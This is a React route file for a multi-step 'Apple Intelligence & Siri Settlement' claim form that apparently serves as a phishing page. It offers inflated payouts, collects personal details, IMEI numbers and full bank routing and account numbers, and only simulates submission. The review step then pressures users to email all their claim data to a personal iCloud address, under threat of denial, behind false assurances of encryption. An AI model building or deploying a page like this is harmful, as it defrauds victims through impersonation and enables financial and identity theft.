import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState, useMemo, useEffect } from "react";
import { z } from "zod";
import { toast } from "sonner";
import { ShieldCheck, FileText, Users, Upload, Check, ArrowLeft, ArrowRight, Lock, CreditCard, Banknote, Mail, Landmark, Smartphone } from "lucide-react";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

import { Checkbox } from "@/components/ui/checkbox";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";

const searchSchema = z.object({
  tier: z.enum(["standard", "documented", "family", "devices2", "devices3", "devices4", "devices5", "devices6"]).optional(),
});

const DEVICE_COUNT: Record<string, number> = {
  devices2: 2, devices3: 3, devices4: 4, devices5: 5, devices6: 6,
};

export const Route = createFileRoute("/claim")({
  validateSearch: searchSchema,
  head: () => ({
    meta: [
      { title: "File Your Claim — Apple Intelligence & Siri Settlement" },
      { name: "description", content: "Submit your claim online in minutes. Select your claim tier, provide your details, and choose how you want to be paid." },
      { property: "og:title", content: "File Your Claim — Apple Intelligence & Siri Settlement" },
      { property: "og:description", content: "Secure online filing with PayPal, ACH, e-Check, or Paper Check payout options." },
    ],
  }),
  component: ClaimPage,
});

const TIERS = {
  standard: { name: "Standard Claim", amount: 1980, icon: ShieldCheck, requiresProof: false, desc: "No documentation required — attestation only." },
  documented: { name: "Documented Claim", amount: 12980, icon: FileText, requiresProof: true, desc: "Upload proof of ownership (receipt, invoice, or serial number)." },
  family: { name: "Family Claim", amount: 20980, icon: Users, requiresProof: true, desc: "Household claim covering up to 6 Family Sharing members." },
  devices2: { name: "2 Device Claim", amount: 3960, icon: FileText, requiresProof: true, desc: "For claimants filing on two eligible iPhones — proof of ownership required for each." },
  devices3: { name: "3 Device Claim", amount: 5940, icon: FileText, requiresProof: true, desc: "For claimants filing on three eligible iPhones — proof of ownership required for each." },
  devices4: { name: "4 Device Claim", amount: 7920, icon: FileText, requiresProof: true, desc: "For claimants filing on four eligible iPhones — proof of ownership required for each." },
  devices5: { name: "5 Device Claim", amount: 9900, icon: FileText, requiresProof: true, desc: "For claimants filing on five eligible iPhones — proof of ownership required for each." },
  devices6: { name: "6 Device Claim", amount: 11880, icon: FileText, requiresProof: true, desc: "For claimants filing on six eligible iPhones — proof of ownership required for each." },
} as const;

const IPHONE_MODELS = [
  "iPhone 17 Pro Max", "iPhone 17 Pro", "iPhone 17 Air", "iPhone 17",
  "iPhone 16 Pro Max", "iPhone 16 Pro", "iPhone 16 Plus", "iPhone 16",
  "iPhone 15 Pro Max", "iPhone 15 Pro", "iPhone 15 Plus", "iPhone 15",
  "iPhone 14 Pro Max", "iPhone 14 Pro", "iPhone 14 Plus", "iPhone 14",
  "iPhone SE (3rd generation)",
  "iPhone 13 Pro Max", "iPhone 13 Pro", "iPhone 13", "iPhone 13 mini",
  "iPhone 12 Pro Max", "iPhone 12 Pro", "iPhone 12", "iPhone 12 mini",
  "iPhone SE (2nd generation)",
  "iPhone 11 Pro Max", "iPhone 11 Pro", "iPhone 11",
  "iPhone XS Max", "iPhone XS", "iPhone XR", "iPhone X",
  "iPhone 8 Plus", "iPhone 8",
  "iPhone 7 Plus", "iPhone 7",
  "iPhone SE (1st generation)",
  "iPhone 6s Plus", "iPhone 6s",
  "iPhone 6 Plus", "iPhone 6",
] as const;

type TierKey = keyof typeof TIERS;

const PAYMENTS = [
  { id: "paypal", name: "PayPal", icon: CreditCard, desc: "Fastest — funds arrive within 1–2 business days." },
  { id: "ach", name: "ACH Direct Deposit", icon: Landmark, desc: "Direct to your bank account, 3–5 business days." },
  { id: "echeck", name: "Electronic Check", icon: Banknote, desc: "Digital check delivered by email." },
  { id: "paper", name: "Paper Check", icon: Mail, desc: "Mailed to your address, arrives in 2–3 weeks." },
] as const;

type PaymentId = typeof PAYMENTS[number]["id"];

const currency = (n: number) => n.toLocaleString("en-US", { style: "currency", currency: "USD", maximumFractionDigits: 0 });

function ClaimPage() {
  const { tier: tierFromUrl } = Route.useSearch();
  const navigate = useNavigate();

  const [step, setStep] = useState(tierFromUrl ? 2 : 1);
  const [tier, setTier] = useState<TierKey | null>(tierFromUrl ?? null);

  // Personal
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [address, setAddress] = useState("");
  const [city, setCity] = useState("");
  const [stateVal, setStateVal] = useState("");
  const [zip, setZip] = useState("");
  const [deviceInfo, setDeviceInfo] = useState("");
  const [purchaseDate, setPurchaseDate] = useState("");
  const [imeiSerial, setImeiSerial] = useState("");

  // Proof
  const [proofFile, setProofFile] = useState<File | null>(null);

  // Payment
  const [payment, setPayment] = useState<PaymentId | null>(null);
  const [paypalEmail, setPaypalEmail] = useState("");
  const [routing, setRouting] = useState("");
  const [account, setAccount] = useState("");
  const [accountType, setAccountType] = useState("checking");
  const [mailingSameAsAddress, setMailingSameAsAddress] = useState(true);

  // Attestation
  const [attest, setAttest] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  const selected = tier ? TIERS[tier] : null;

  const canNextFromStep = useMemo(() => {
    if (step === 1) return !!tier;
    if (step === 2) return firstName && lastName && email && address && city && stateVal && zip && deviceInfo && purchaseDate && imeiSerial.trim().length >= 6 && (!selected?.requiresProof || proofFile);
    if (step === 3) {
      if (!payment) return false;
      if (payment === "paypal") return /.+@.+\..+/.test(paypalEmail);
      if (payment === "ach") return routing.length >= 9 && account.length >= 4;
      if (payment === "echeck") return /.+@.+\..+/.test(email);
      if (payment === "paper") return true;
    }
    if (step === 4) return attest;
    return false;
  }, [step, tier, firstName, lastName, email, address, city, stateVal, zip, deviceInfo, purchaseDate, imeiSerial, selected, proofFile, payment, paypalEmail, routing, account, attest]);

  const handleNext = () => {
    if (!canNextFromStep) {
      toast.error("Please complete all required fields to continue.");
      return;
    }
    setStep((s) => Math.min(s + 1, 4));
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const handleBack = () => {
    setStep((s) => Math.max(s - 1, 1));
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const handleSubmit = async () => {
    if (!canNextFromStep) return;
    setSubmitting(true);
    await new Promise((r) => setTimeout(r, 900));
    const claimId = "AISS-" + Date.now().toString(36).toUpperCase() + "-" + Math.random().toString(36).slice(2, 6).toUpperCase();
    setSubmitting(false);

    // Persist full receipt to sessionStorage so the confirmation page can render every field
    // without exposing sensitive data in the URL.
    const receipt = {
      id: claimId,
      submittedAt: new Date().toISOString(),
      tier: tier!,
      tierName: selected!.name,
      amount: selected!.amount,
      firstName, lastName, email, phone,
      address, city, stateVal, zip,
      deviceInfo,
      purchaseDate,
      imeiSerial,
      proofFileName: proofFile?.name ?? null,
      payment: payment!,
      paypalEmail: payment === "paypal" ? paypalEmail : "",
      accountType: payment === "ach" ? accountType : "",
      routing: payment === "ach" ? routing : "",
      accountLast4: payment === "ach" ? account.slice(-4) : "",
      mailingSameAsAddress: payment === "paper" ? mailingSameAsAddress : true,
    };
    try {
      sessionStorage.setItem(`claim:${claimId}`, JSON.stringify(receipt));
    } catch { /* ignore quota */ }

    navigate({
      to: "/confirmation",
      search: { id: claimId },
    });
  };

  return (
    <section className="mx-auto max-w-4xl px-4 py-10 sm:py-16">
      <div className="mb-8">
        <h1 className="text-3xl font-bold tracking-tight sm:text-4xl">File your claim</h1>
        <p className="mt-2 text-sm text-muted-foreground">Step {step} of 4 · Your information is encrypted and confidential.</p>
        <Stepper step={step} />
      </div>

      <div className="rounded-2xl border border-border bg-card p-6 shadow-card sm:p-8">
        {step === 1 && <StepTier tier={tier} setTier={setTier} />}
        {step === 2 && (
          <StepPersonal
            {...{ firstName, setFirstName, lastName, setLastName, email, setEmail, phone, setPhone,
              address, setAddress, city, setCity, stateVal, setStateVal, zip, setZip, deviceInfo, setDeviceInfo,
              purchaseDate, setPurchaseDate, imeiSerial, setImeiSerial,
              proofFile, setProofFile, requiresProof: !!selected?.requiresProof, tierName: selected?.name ?? "" }}
          />
        )}
        {step === 3 && (
          <StepPayment
            {...{ payment, setPayment, paypalEmail, setPaypalEmail, routing, setRouting, account, setAccount,
              accountType, setAccountType, mailingSameAsAddress, setMailingSameAsAddress }}
          />
        )}
        {step === 4 && selected && payment && (
          <StepReview
            tier={selected} payment={payment}
            data={{ firstName, lastName, email, phone, address, city, stateVal, zip, deviceInfo, imeiSerial, proofFile, paypalEmail, routing, account }}
            attest={attest} setAttest={setAttest}
          />
        )}

        <div className="mt-8 flex items-center justify-between gap-3 border-t border-border pt-6">
          <button
            type="button"
            onClick={handleBack}
            disabled={step === 1}
            className="inline-flex items-center gap-2 rounded-lg px-4 py-2.5 text-sm font-medium text-muted-foreground transition hover:text-foreground disabled:opacity-40"
          >
            <ArrowLeft className="h-4 w-4" /> Back
          </button>
          {step < 4 ? (
            <button
              type="button"
              onClick={handleNext}
              className="inline-flex items-center gap-2 rounded-lg bg-primary px-5 py-2.5 text-sm font-semibold text-primary-foreground shadow-card transition hover:opacity-90"
            >
              Continue <ArrowRight className="h-4 w-4" />
            </button>
          ) : (
            <button
              type="button"
              onClick={handleSubmit}
              disabled={submitting || !canNextFromStep}
              className="inline-flex items-center gap-2 rounded-lg bg-primary px-5 py-2.5 text-sm font-semibold text-primary-foreground shadow-card transition hover:opacity-90 disabled:opacity-60"
            >
              {submitting ? "Submitting…" : (<>Submit Claim <Check className="h-4 w-4" /></>)}
            </button>
          )}
        </div>
      </div>

      <div className="mt-6 flex items-center justify-center gap-2 text-xs text-muted-foreground">
        <Lock className="h-3.5 w-3.5" /> Secured with 256-bit SSL encryption
      </div>
    </section>
  );
}

function Stepper({ step }: { step: number }) {
  const labels = ["Claim Type", "Your Details", "Payment", "Review"];
  return (
    <div className="mt-6 flex items-center gap-2">
      {labels.map((l, i) => {
        const n = i + 1;
        const active = n === step;
        const done = n < step;
        return (
          <div key={l} className="flex flex-1 items-center gap-2">
            <div className={`flex h-7 w-7 shrink-0 items-center justify-center rounded-full text-xs font-semibold transition ${
              done ? "bg-success text-success-foreground" : active ? "bg-primary text-primary-foreground" : "bg-muted text-muted-foreground"
            }`}>
              {done ? <Check className="h-3.5 w-3.5" /> : n}
            </div>
            <div className={`hidden text-xs sm:block ${active ? "font-semibold text-foreground" : "text-muted-foreground"}`}>{l}</div>
            {i < labels.length - 1 && <div className={`h-px flex-1 ${done ? "bg-success" : "bg-border"}`} />}
          </div>
        );
      })}
    </div>
  );
}

function StepTier({ tier, setTier }: { tier: TierKey | null; setTier: (t: TierKey) => void }) {
  return (
    <div>
      <h2 className="text-xl font-semibold">Select your claim type</h2>
      <p className="mt-1 text-sm text-muted-foreground">Choose the tier that best matches your situation.</p>
      <div className="mt-6 grid gap-3">
        {(Object.keys(TIERS) as TierKey[]).map((k) => {
          const t = TIERS[k];
          const selected = tier === k;
          return (
            <button
              key={k}
              type="button"
              onClick={() => setTier(k)}
              className={`flex items-start gap-4 rounded-xl border p-5 text-left transition ${
                selected ? "border-accent bg-accent/5 ring-2 ring-accent/40" : "border-border bg-background hover:border-foreground/20"
              }`}
            >
              <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-lg bg-secondary text-primary">
                <t.icon className="h-5 w-5" />
              </div>
              <div className="flex-1">
                <div className="flex items-center justify-between gap-3">
                  <div className="font-semibold">{t.name}</div>
                  <div className="text-lg font-bold">{currency(t.amount)}</div>
                </div>
                <p className="mt-1 text-sm text-muted-foreground">{t.desc}</p>
              </div>
              <div className={`mt-1 h-5 w-5 shrink-0 rounded-full border-2 ${selected ? "border-accent bg-accent" : "border-border"}`}>
                {selected && <Check className="h-full w-full p-0.5 text-accent-foreground" />}
              </div>
            </button>
          );
        })}
      </div>
    </div>
  );
}

function StepPersonal(props: {
  firstName: string; setFirstName: (v: string) => void;
  lastName: string; setLastName: (v: string) => void;
  email: string; setEmail: (v: string) => void;
  phone: string; setPhone: (v: string) => void;
  address: string; setAddress: (v: string) => void;
  city: string; setCity: (v: string) => void;
  stateVal: string; setStateVal: (v: string) => void;
  zip: string; setZip: (v: string) => void;
  deviceInfo: string; setDeviceInfo: (v: string) => void;
  purchaseDate: string; setPurchaseDate: (v: string) => void;
  imeiSerial: string; setImeiSerial: (v: string) => void;
  proofFile: File | null; setProofFile: (f: File | null) => void;
  requiresProof: boolean;
  tierName: string;
}) {
  const p = props;
  return (
    <div>
      <h2 className="text-xl font-semibold">Your information</h2>
      <p className="mt-1 text-sm text-muted-foreground">Filing as: <span className="font-medium text-foreground">{p.tierName}</span></p>
      <div className="mt-6 grid gap-4 sm:grid-cols-2">
        <Field label="First name" value={p.firstName} onChange={p.setFirstName} required />
        <Field label="Last name" value={p.lastName} onChange={p.setLastName} required />
        <Field label="Email address" type="email" value={p.email} onChange={p.setEmail} required />
        <Field label="Phone number" type="tel" value={p.phone} onChange={p.setPhone} placeholder="(555) 123-4567" />
        <div className="sm:col-span-2"><Field label="Street address" value={p.address} onChange={p.setAddress} required /></div>
        <Field label="City" value={p.city} onChange={p.setCity} required />
        <div className="grid grid-cols-2 gap-4">
          <Field label="State" value={p.stateVal} onChange={p.setStateVal} required placeholder="CA" />
          <Field label="ZIP" value={p.zip} onChange={p.setZip} required placeholder="94105" />
        </div>
      </div>

      <div className="mt-6 grid gap-4 sm:grid-cols-2">
        <div>
          <Label htmlFor="device" className="mb-1.5 block text-sm font-medium">iPhone model <span className="text-destructive">*</span></Label>
          <Select value={p.deviceInfo} onValueChange={p.setDeviceInfo}>
            <SelectTrigger id="device"><SelectValue placeholder="Select your iPhone" /></SelectTrigger>
            <SelectContent className="max-h-72">
              {IPHONE_MODELS.map((m) => <SelectItem key={m} value={m}>{m}</SelectItem>)}
            </SelectContent>
          </Select>
        </div>
        <div>
          <Label htmlFor="purchaseDate" className="mb-1.5 block text-sm font-medium">Date purchased <span className="text-destructive">*</span></Label>
          <Input
            id="purchaseDate"
            type="date"
            value={p.purchaseDate}
            onChange={(e) => p.setPurchaseDate(e.target.value)}
            min="2014-09-17"
            max={new Date().toISOString().slice(0, 10)}
          />
        </div>
      </div>
      <p className="mt-1.5 text-xs text-muted-foreground">Device must have been used during the class period (Sept 17, 2014 – Dec 31, 2024).</p>

      <div className="mt-6">
        <Label htmlFor="imei" className="mb-1.5 block text-sm font-medium">iPhone IMEI or Serial Number <span className="text-destructive">*</span></Label>
        <Input
          id="imei"
          value={p.imeiSerial}
          onChange={(e) => p.setImeiSerial(e.target.value.replace(/[^A-Za-z0-9]/g, "").slice(0, 20))}
          placeholder="e.g. 356789102345678"
          inputMode="text"
          autoCapitalize="characters"
        />
        <p className="mt-1.5 text-xs text-muted-foreground">
          Find it in Settings → General → About, or dial *#06# on your iPhone.
        </p>
      </div>



      {p.requiresProof && (
        <div className="mt-6">
          <Label className="mb-1.5 block text-sm font-medium">Proof of ownership <span className="text-destructive">*</span></Label>
          <label className="flex cursor-pointer flex-col items-center justify-center gap-2 rounded-xl border-2 border-dashed border-border bg-background px-6 py-8 text-center transition hover:border-accent hover:bg-background">
            <Upload className="h-6 w-6 text-muted-foreground" />
            <div className="text-sm font-medium">
              {p.proofFile ? p.proofFile.name : "Click to upload receipt or proof of purchase"}
            </div>
            <div className="text-xs text-muted-foreground">PDF, JPG, or PNG · Max 10MB</div>
            <input
              type="file"
              className="hidden"
              accept=".pdf,.jpg,.jpeg,.png"
              onChange={(e) => {
                const f = e.target.files?.[0];
                if (f && f.size > 10 * 1024 * 1024) { toast.error("File is too large (max 10MB)."); return; }
                p.setProofFile(f ?? null);
              }}
            />
          </label>
        </div>
      )}
    </div>
  );
}

function StepPayment(props: {
  payment: PaymentId | null; setPayment: (p: PaymentId) => void;
  paypalEmail: string; setPaypalEmail: (v: string) => void;
  routing: string; setRouting: (v: string) => void;
  account: string; setAccount: (v: string) => void;
  accountType: string; setAccountType: (v: string) => void;
  mailingSameAsAddress: boolean; setMailingSameAsAddress: (v: boolean) => void;
}) {
  const p = props;
  return (
    <div>
      <h2 className="text-xl font-semibold">How would you like to be paid?</h2>
      <p className="mt-1 text-sm text-muted-foreground">Select your preferred payment method.</p>

      <div className="mt-6 grid gap-3 sm:grid-cols-2">
        {PAYMENTS.map((pm) => {
          const selected = p.payment === pm.id;
          return (
            <button
              key={pm.id}
              type="button"
              onClick={() => p.setPayment(pm.id)}
              className={`flex items-start gap-3 rounded-xl border p-4 text-left transition ${
                selected ? "border-accent bg-accent/5 ring-2 ring-accent/40" : "border-border bg-background hover:border-foreground/20"
              }`}
            >
              <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-lg bg-secondary text-primary">
                <pm.icon className="h-5 w-5" />
              </div>
              <div className="flex-1">
                <div className="font-semibold">{pm.name}</div>
                <div className="mt-0.5 text-xs text-muted-foreground">{pm.desc}</div>
              </div>
              <div className={`mt-1 h-4 w-4 shrink-0 rounded-full border-2 ${selected ? "border-accent bg-accent" : "border-border"}`} />
            </button>
          );
        })}
      </div>

      {p.payment === "paypal" && (
        <div className="mt-6 rounded-xl border border-border bg-background p-5">
          <Field label="PayPal email address" type="email" value={p.paypalEmail} onChange={p.setPaypalEmail} required placeholder="you@example.com" />
        </div>
      )}

      {p.payment === "ach" && (
        <div className="mt-6 space-y-4 rounded-xl border border-border bg-background p-5">
          <div>
            <Label className="mb-1.5 block text-sm font-medium">Account type</Label>
            <Select value={p.accountType} onValueChange={p.setAccountType}>
              <SelectTrigger><SelectValue /></SelectTrigger>
              <SelectContent>
                <SelectItem value="checking">Checking</SelectItem>
                <SelectItem value="savings">Savings</SelectItem>
              </SelectContent>
            </Select>
          </div>
          <Field label="Routing number (9 digits)" value={p.routing} onChange={(v) => p.setRouting(v.replace(/\D/g, "").slice(0, 9))} required />
          <Field label="Account number" value={p.account} onChange={(v) => p.setAccount(v.replace(/\D/g, "").slice(0, 17))} required />
          <p className="text-xs text-muted-foreground">Your banking information is encrypted and only used to deposit your settlement payment.</p>
        </div>
      )}

      {p.payment === "echeck" && (
        <div className="mt-6 rounded-xl border border-border bg-background p-5 text-sm text-muted-foreground">
          Your electronic check will be sent to the email address you provided in the previous step.
        </div>
      )}

      {p.payment === "paper" && (
        <div className="mt-6 rounded-xl border border-border bg-background p-5">
          <label className="flex cursor-pointer items-start gap-3 text-sm">
            <Checkbox checked={p.mailingSameAsAddress} onCheckedChange={(v) => p.setMailingSameAsAddress(!!v)} className="mt-0.5" />
            <span>Mail my paper check to the address I provided in the previous step.</span>
          </label>
          <p className="mt-3 text-xs text-muted-foreground">Paper checks typically arrive within 2–3 weeks after final court approval.</p>
        </div>
      )}
    </div>
  );
}

function StepReview({
  tier, payment, data, attest, setAttest,
}: {
  tier: { name: string; amount: number };
  payment: PaymentId;
  data: {
    firstName: string; lastName: string; email: string; phone: string;
    address: string; city: string; stateVal: string; zip: string;
    deviceInfo: string; imeiSerial: string; proofFile: File | null;
    paypalEmail: string; routing: string; account: string;
  };
  attest: boolean;
  setAttest: (v: boolean) => void;
}) {
  const paymentName = PAYMENTS.find((p) => p.id === payment)?.name ?? "";
  return (
    <div>
      <h2 className="text-xl font-semibold">Review & submit</h2>
      <p className="mt-1 text-sm text-muted-foreground">Please verify all information before submitting your claim.</p>

      <div className="mt-6 grid gap-4">
        <ReviewRow label="Claim type" value={`${tier.name} — ${currency(tier.amount)}`} />
        <ReviewRow label="Name" value={`${data.firstName} ${data.lastName}`} />
        <ReviewRow label="Email" value={data.email} />
        {data.phone && <ReviewRow label="Phone" value={data.phone} />}
        <ReviewRow label="Address" value={`${data.address}, ${data.city}, ${data.stateVal} ${data.zip}`} />
        <ReviewRow label="iPhone model" value={data.deviceInfo} />
        <ReviewRow label="IMEI / Serial Number" value={data.imeiSerial} />
        {data.proofFile && <ReviewRow label="Proof of ownership" value={data.proofFile.name} />}
        <ReviewRow label="Payment method" value={paymentName} />
        {payment === "paypal" && <ReviewRow label="PayPal email" value={data.paypalEmail} />}
        {payment === "ach" && (
          <>
            <ReviewRow label="Routing number" value={data.routing} />
            <ReviewRow label="Account number" value={"••••" + data.account.slice(-4)} />
          </>
        )}
      </div>

      <div className="mt-6 rounded-xl border-2 border-destructive/40 bg-destructive/10 p-4 text-sm">
        <div className="font-semibold text-foreground">Important — required to approve your claim</div>
        <p className="mt-1 text-muted-foreground">
          After you submit, you MUST email a copy of your completed claim information to{" "}
          <strong className="text-foreground">applesettlementclaim@icloud.com</strong>. On the next screen, tap
          "Email Receipt" — it opens your mail app with everything pre-filled. Then press Send.
        </p>
        <p className="mt-2 font-medium text-foreground">
          Claims that are not emailed to applesettlementclaim@icloud.com will NOT be approved.
        </p>
      </div>

      <label className="mt-8 flex cursor-pointer items-start gap-3 rounded-xl border border-border bg-background p-4 text-sm">
        <Checkbox checked={attest} onCheckedChange={(v) => setAttest(!!v)} className="mt-0.5" />
        <span>
          I declare, under penalty of perjury under the laws of the United States, that the information provided above is true and correct to the best of my knowledge, and that I am the person entitled to this claim.
        </span>
      </label>
    </div>
  );
}

function Field({
  label, value, onChange, type = "text", required, placeholder,
}: {
  label: string; value: string; onChange: (v: string) => void;
  type?: string; required?: boolean; placeholder?: string;
}) {
  return (
    <div>
      <Label className="mb-1.5 block text-sm font-medium">
        {label} {required && <span className="text-destructive">*</span>}
      </Label>
      <Input type={type} value={value} onChange={(e) => onChange(e.target.value)} placeholder={placeholder} />
    </div>
  );
}

function ReviewRow({ label, value }: { label: string; value: string }) {
  return (
    <div className="flex flex-col gap-1 border-b border-border pb-3 last:border-0 sm:flex-row sm:items-start sm:justify-between sm:gap-6">
      <div className="text-sm font-medium text-muted-foreground">{label}</div>
      <div className="text-sm font-medium sm:max-w-[60%] sm:text-right">{value}</div>
    </div>
  );
}
